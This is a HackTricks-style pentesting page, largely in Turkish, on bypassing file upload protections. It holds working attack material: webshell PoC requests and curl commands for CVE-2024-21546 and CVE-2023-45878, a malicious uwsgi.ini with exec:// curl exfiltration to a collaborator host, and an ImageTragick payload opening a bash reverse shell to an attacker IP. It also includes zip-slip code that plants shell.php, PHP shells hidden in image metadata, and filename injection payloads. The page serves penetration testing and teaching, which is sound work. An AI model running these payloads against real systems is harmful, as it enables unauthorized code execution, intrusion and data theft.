# Dosya Yükleme

{{#include ../../banners/hacktricks-training.md}}

## Dosya Yükleme Genel Metodolojisi

Diğer faydalı uzantılar:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **PHPv8 ile çalışırken**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Dosya uzantısı kontrollerini atlatma

1. Uygulanıyorsa, **önceki uzantıları kontrol edin.** Ayrıca bunları bazı **büyük harf** varyasyonlarıyla test edin: _pHp, .pHP5, .PhAr ..._
2. _Yürütme uzantısından **önce geçerli bir uzantı eklemeyi kontrol edin** (önceki uzantıları da kullanın):_
- _file.png.php_
- _file.png.Php5_
3. Sondan **özel karakterler eklemeyi deneyin.** Tüm **ascii** ve **Unicode** karakterlerini **bruteforce** etmek için Burp kullanabilirsiniz. (_Not: ayrıca daha önce belirtilen **uzantıları** de kullanmayı deneyebilirsiniz_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Sunucu tarafındaki uzantı ayrıştırıcısını **kandırarak** korumaları atlatmayı deneyin; örnek olarak **uzantıyı çiftlemek** veya uzantılar arasına **junk** veri (**null** byte'lar) eklemek gibi teknikleri kullanın. _Daha iyi bir payload hazırlamak için **önceki uzantıları** de kullanabilirsiniz._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Önceki kontrole **başka bir uzantı katmanı** ekleyin:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Yürütme uzantısını geçerli uzantıdan **önce koymayı** deneyin ve sunucunun yanlış yapılandırılmış olmasını umun. (Apache yanlış yapılandırmalarını sömürmek için faydalıdır; örneğin uzantısı .php olan herhangi bir şey, .php ile bitmese bile kodu çalıştırıyor olabilir):
- _ex: file.php.png_
7. **Windows** üzerinde **NTFS alternate data stream (ADS)** kullanma. Bu durumda, yasaklı uzantıdan sonra ve izin verilen uzantıdan önce iki nokta ":" karakteri eklenecektir. Sonuç olarak sunucuda **yasaklı uzantıya sahip boş bir dosya** oluşturulur (örn. "file.asax:.jpg"). Bu dosya daha sonra kısa dosya adı gibi diğer tekniklerle düzenlenebilir. "**::$data**” deseni boş olmayan dosyalar oluşturmak için de kullanılabilir. Bu nedenle, bu desenin sonuna bir nokta karakteri eklemek, ek kısıtlamaları atlatmak için faydalı olabilir (örn. "file.asp::$data.").
8. Dosya adı sınırlarını aşmayı deneyin. Geçerli uzantı kesilir ve kötü amaçlı PHP kalır. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. sonda nokta) – CVE-2024-21546

Bazı upload handler'ları kaydedilen dosya adındaki sondaki nokta karakterlerini keser veya normalleştirir. UniSharp’ın Laravel Filemanager (unisharp/laravel-filemanager) 2.9.1 öncesi sürümlerinde uzantı doğrulamasını şu şekilde atlatabilirsiniz:

- Geçerli bir image MIME tipi ve magic header kullanmak (örn. PNG’nin `\x89PNG\r\n\x1a\n`).
- Yüklenen dosyayı PHP uzantısı sonuna bir nokta ekleyerek adlandırmak, örn. `shell.php.`.
- Sunucu sondaki noktayı kaldırır ve `shell.php` olarak saklar; bu dosya web'de servis edilen bir dizine (varsayılan public storage gibi `/storage/files/`) yerleştirilmişse çalıştırılacaktır.

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Sonra kaydedilen yola istek gönderin (Laravel + LFM'de tipik):
```
GET /storage/files/0xdf.php?cmd=id
```
Önlemler:
- unisharp/laravel-filemanager'ı ≥ 2.9.1 sürümüne yükseltin.
- Sunucu tarafında katı izin listeleri uygulayın ve kalıcı dosya adını yeniden doğrulayın.
- Yüklemeleri yürütülebilir olmayan konumlardan servis edin.

### Content-Type, Magic Number, Compression & Resizing'i Atlatma

- **Content-Type** kontrollerini **Content-Type** **header**ının **value**sını şu değerlerden biriyle ayarlayarak atlatın: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- **magic number** kontrolünü, dosyanın başına gerçek bir görüntünün **bytes**larını ekleyerek ( _file_ komutunu yanıltmak için) atlatın. Veya shell'i **metadata** içine yerleştirin:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` veya payload'ı doğrudan bir görüntüye de yerleştirebilirsiniz:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Eğer görüntünüze **sıkıştırma** ekleniyorsa, örneğin [PHP-GD](https://www.php.net/manual/fr/book.image.php) gibi standart PHP kütüphaneleri kullanılıyorsa, önceki teknikler işe yaramayabilir. Ancak, **sıkıştırmaya dayanacak** bazı metinler eklemek için **PLTE chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanılabilir.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web sayfası ayrıca görüntüyü PHP-GD fonksiyonları `imagecopyresized` veya `imagecopyresampled` gibi fonksiyonlarla **yeniden boyutlandırıyor** olabilir. Ancak, **sıkıştırmaya dayanacak** metin eklemek için **IDAT chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanılabilir.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Bir başka teknik, PHP-GD fonksiyonu `thumbnailImage` kullanıldığında bile **yeniden boyutlandırmaya dayanacak** bir payload oluşturmayı sağlar. Ancak, **sıkıştırmaya dayanacak** metin eklemek için **tEXt chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanılabilir.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Kontrol Edilecek Diğer Hileler

- Zaten yüklenmiş dosyanın uzantısını değiştirmek için dosyayı **yeniden adlandırma** zafiyeti bulun.
- Backdoor'u çalıştırmak için bir **Local File Inclusion** zafiyeti bulun.
- Olası bilgi sızması:
1. Aynı dosyayı aynı isimle **birden fazla kez** (ve **aynı anda**) yükleyin.
2. Zaten var olan bir **dosya** veya **klasör** adıyla dosya yükleyin.
3. Adı **"." , "..", veya "…" olan bir dosya yükleyin. Örneğin, Apache üzerinde **Windows**'ta uygulama yüklenen dosyaları "/www/uploads/" dizinine kaydettiğinde, "." dosya adı "/www/" dizininde "uploads" adlı bir dosya oluşturacaktır.
4. **NTFS** üzerinde kolay silinemeyen bir dosya yükleyin, örneğin **"…:.jpg"**. (Windows)
5. **Windows** üzerinde adında `|<>*?”` gibi **geçersiz karakterler** olan bir dosya yükleyin.
6. **Windows** üzerinde CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 ve LPT9 gibi **rezerved** (**yasaklı**) isimleri kullanarak dosya yükleyin.
- Bir de **yürütülebilir** (.exe) veya kazara açıldığında kod çalıştıracak daha az şüpheli bir **.html** yüklemeyi deneyin.

### Özel uzantı hileleri

Eğer **PHP server**a dosya yüklemeye çalışıyorsanız, [kod çalıştırmak için **.htaccess** hilesine bir göz atın](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Eğer **ASP server**a dosya yüklemeye çalışıyorsanız, [kod çalıştırmak için **.config** hilesine bir göz atın](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` dosyaları Java için `.jar` gibidir, ancak php için olup **php dosyası gibi kullanılabilir** (php ile çalıştırma veya bir script içine include etme...).

`.inc` uzantısı bazen sadece dosya içe aktarmak için kullanılan php dosyaları için kullanılır; bu yüzden bir noktada biri bu uzantının yürütülmesine izin vermiş olabilir.

## **Jetty RCE**

Eğer bir Jetty sunucusuna XML dosyası yükleyebiliyorsanız, [RCE elde edebilirsiniz çünkü **yeni *.xml ve *.war dosyaları otomatik olarak işlenir**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1). Bu yüzden, aşağıdaki görselde belirtildiği gibi XML dosyasını `$JETTY_BASE/webapps/` dizinine yükleyin ve shell bekleyin!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Bu zafiyetin detaylı incelemesi için orijinal araştırmaya bakın: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) zafiyetleri, `.ini` konfigürasyon dosyasını değiştirme yeteneğiniz varsa uWSGI sunucularında kullanılabilir. uWSGI konfigürasyon dosyaları "magic" değişkenler, placeholder'lar ve operatörleri içerecek şekilde özel bir sözdizimi kullanır. Özellikle '@' operatörü, `@(filename)` şeklinde kullanıldığında bir dosyanın içeriğini dahil etmek için tasarlanmıştır. uWSGI'de desteklenen çeşitli scheme'ler arasında "exec" scheme'i özellikle güçlüdür; bir sürecin standard output'undan veri okunmasına izin verir. Bir `.ini` konfigürasyon dosyası işlendiğinde bu özellik, Remote Command Execution veya Arbitrary File Write/Read gibi kötü amaçlı kullanım senaryoları için manipüle edilebilir.

Aşağıdaki, çeşitli scheme'leri gösteren zararlı bir `uwsgi.ini` dosyası örneğini düşünün:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Payload'un yürütülmesi, konfigürasyon dosyasının ayrıştırılması sırasında gerçekleşir. Konfigürasyonun etkinleşip ayrıştırılması için uWSGI sürecinin ya yeniden başlatılması (muhtemelen bir crash sonrası veya bir Denial of Service saldırısı nedeniyle) ya da dosyanın auto-reload olarak ayarlanması gerekir. Auto-reload özelliği etkinse, değişiklikleri algıladığında dosyayı belirlenen aralıklarla yeniden yükler.

uWSGI'nin konfigürasyon dosyası ayrıştırmasının gevşek doğasını anlamak kritiktir. Özellikle, bahsedilen payload bir binary file'ın içine (ör. image veya PDF) yerleştirilebilir; bu da potansiyel sömürü alanını daha da genişletir.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Gibbon LMS'deki unauthenticated endpoint, web root içinde arbitrary file write yapılmasına izin veriyor; bir PHP dosyası bırakılarak pre-auth RCE'ye yol açıyor. Etkilenen sürümler: 25.0.01 dahil olmak üzere öncesi.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Gerekli parametreler:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: hedef dosya adı, Gibbon install dir'e göre göreceli (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: herhangi bir boş olmayan değer kabul edilir (e.g., `0000000001`)

Bir dosyayı yazıp geri okumak için minimal PoC:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Minimal bir webshell bırakın ve komutları çalıştırın:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notlar:
- İşleyici `base64_decode($_POST["img"])` gerçekleştirir; önce `;` ve `,` ile ayırdıktan sonra uzantı/tipi doğrulamadan byte'ları `$absolutePath . '/' . $_POST['path']`'e yazar.
- Ortaya çıkan kod web servis kullanıcısı olarak çalışır (ör. XAMPP Apache on Windows).

Bu hata için referanslar arasında usd HeroLab advisory ve NVD girdisi bulunur. Aşağıdaki References bölümüne bakın.

## **wget File Upload/SSRF Trick**

Bazı durumlarda bir sunucunun **`wget`** ile **dosya indirdiğini** ve sizin **URL** belirtebildiğinizi görebilirsiniz. Bu durumlarda kod, indirilen dosyaların uzantısının yalnızca izin verilenlerin indirileceğinden emin olmak için bir whitelist içinde olup olmadığını kontrol ediyor olabilir. Ancak, **bu kontrol atlatılabilir.**\

Bir **dosya adı**nın **linux**'teki **azami** uzunluğu **255**'tir, ancak **wget** dosya adlarını **236** karaktere kadar kısaltır. **"A"*232+".php"+".gif"** adlı bir dosyayı indirebilirsiniz; bu dosya adı **kontrolü atlatacak** (bu örnekte **".gif"** **geçerli** bir uzantıdır) fakat `wget` dosyayı **"A"*232+".php"** olarak **yeniden adlandıracaktır**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Some legacy upload handlers that use `snprintf()` or similar to build multi-file arrays from a single-file upload can be tricked into forging the `_FILES` structure. Due to inconsistencies and truncation in `snprintf()` behavior, a carefully crafted single upload can appear as multiple indexed files on the server side, confusing logic that assumes a strict shape (e.g., treating it as a multi-file upload and taking unsafe branches). While niche today, this “index corruption” pattern occasionally resurfaces in CTFs and older codebases.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirüs**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Eklentisi


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar Dosyasının Sunucuda Otomatik Olarak Açılması

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Farklı klasörlere çıkarma

Arşiv açma sırasında dizinlerde beklenmeyen dosyaların oluşturulması önemli bir sorundur. Başlangıçta bu yapılandırmanın kötü amaçlı file uploads yoluyla OS-level command execution'a karşı koruma sağlayabileceği varsayılsa da, ZIP archive formatının hiyerarşik sıkıştırma desteği ve directory traversal yetenekleri istismar edilebilir. Bu, saldırganların kısıtlamaları atlatmasına ve hedef uygulamanın decompression işlevini manipüle ederek güvenli upload dizinlerinden kaçmasına izin verir.

Böyle dosyalar oluşturmak için otomatik bir exploit [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) üzerinde mevcuttur. Araç şu şekilde kullanılabilir:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Ek olarak, **symlink trick with evilarc** bir seçenektir. Hedef `/flag.txt` gibi bir dosya olduğunda, sisteminizde o dosyaya bir symlink oluşturulmalıdır. Bu, evilarc'ın işleyişi sırasında hata almasını engeller.

Aşağıda kötü amaçlı bir zip dosyası oluşturmak için kullanılan Python koduna bir örnek verilmiştir:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Daha fazla bilgi için **orijinal gönderiyi inceleyin**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP kodu, `$_REQUEST` değişkeniyle iletilen komutları çalıştıracak şekilde yazılmıştır.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Birden fazla dosya oluşturulur ve bu dosyaları içeren bir zip arşivi oluşturulur.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Zip içindeki dosya adları, vi veya bir hex editör kullanılarak değiştirilir; "xxA" dizin atlaması yapmak için "../" ile değiştirilir.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Bu içeriği bir image uzantısıyla yükleyerek açığı exploit edin **(ImageMagick , 7.0.1-1)** (exploit için: [https://www.exploit-db.com/exploits/39767])
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

PNG dosyasının IDAT chunk'ına bir PHP shell gömmek, belirli resim işleme operasyonlarını etkili bir şekilde atlatabilir. PHP-GD'nin `imagecopyresized` ve `imagecopyresampled` fonksiyonları bu bağlamda özellikle önemlidir; bunlar sırasıyla görüntüleri yeniden boyutlandırmak ve yeniden örneklemek için yaygın olarak kullanılır. Gömülü PHP shell'in bu işlemlerden etkilenmeden kalabilmesi, bazı kullanım senaryoları için önemli bir avantaj sağlar.

Bu tekniğin metodolojisi ve potansiyel uygulamalarını içeren ayrıntılı bir inceleme aşağıdaki makalede bulunabilir: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Bu kaynak süreç ve etkileri hakkında kapsamlı bir anlayış sunar.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot dosyalar siber güvenlikte benzersiz bir araç olarak hizmet eder; aynı anda birden fazla dosya formatında geçerli şekilde bulunabilen kamuflajlar gibidirler. İlginç bir örnek [GIFAR](https://en.wikipedia.org/wiki/Gifar), hem GIF hem de RAR arşivi olarak işlev gören bir hibrittir. Bu tür dosyalar bu eşleşmeyle sınırlı değildir; GIF ve JS veya PPT ve JS gibi kombinasyonlar da mümkündür.

Polyglot dosyaların temel faydası, dosya türüne göre tarama yapan güvenlik önlemlerini atlatma yetenekleridir. Birçok uygulamada yalnızca JPEG, GIF veya DOC gibi belirli dosya türlerinin yüklenmesine izin verilerek potansiyel olarak zararlı formatların (ör. JS, PHP veya Phar dosyaları) riski azaltılmaya çalışılır. Ancak bir polyglot, birden fazla dosya türünün yapısal kriterlerine uyduğu için bu kısıtlamaları gizlice aşabilir.

Uyarlanabilir olmalarına rağmen polyglot'ların sınırlamaları vardır. Örneğin bir polyglot aynı anda bir PHAR file (PHp ARchive) ve bir JPEG olabilir, ancak yükleme başarısı platformun dosya uzantısı politikalarına bağlı olabilir. Sistem izin verilen uzantılarda katıysa, polyglot'un yapısal ikiliği yüklenmesini garanti etmeyebilir.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

How to avoid file type detections by uploading a valid JSON file even if not allowed by faking a PDF file (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: As long as the `%PDF` magic bytes are in the first 1024 bytes it’s valid (get example from post)
- **`pdflib` library**: Add a fake PDF format inside a filed of the JSON so the library thinks it’s a pdf (get example from post)
- **`file` binary**: It can read up to 1048576 bytes from a file. Just create a JSON bigger than that so it cannot parse the content as a json and then inside the JSON put the initial part of a real PDF and it’ll think it’s a PDF

## Referanslar

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

